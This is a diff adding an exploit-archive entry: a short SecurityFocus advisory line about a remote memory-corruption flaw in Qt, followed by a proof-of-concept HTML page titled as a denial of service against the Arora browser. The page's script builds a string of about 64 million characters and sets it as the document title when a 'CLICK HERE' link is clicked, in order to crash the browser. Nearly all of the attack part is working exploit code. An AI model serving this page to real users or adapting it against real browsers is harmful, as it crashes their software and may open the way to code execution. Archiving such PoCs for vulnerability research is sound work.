@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/41873/info
+
+Qt is prone to a remote memory-corruption vulnerability.
+
+Successful exploits may allow the attacker to execute arbitrary code in the context of the application. Failed exploit attempts will result in a denial-of-service condition. 
+
+<html>
+<head>
+<title>Arora browser Remote Denial fo Service </title>
+<body bgcolor="black">
+
+<script type="text/javascript">
+function garbage() {
+    var buffer = "";
+    for (var i = 0; i < 8000; i++) {
+        buffer += "A";
+    }
+    var buffer2 = buffer;
+    for (i = 0; i < 8000; i++) {
+        buffer2 += buffer;
+    }
+    document.title = buffer2;
+}
+</script>
+</head>
+<body>
+<center>
+<br><h2>==> <a href="javascript:garbage();">CLICK HERE</a></font> <==</h2>
+</body>
+</html>
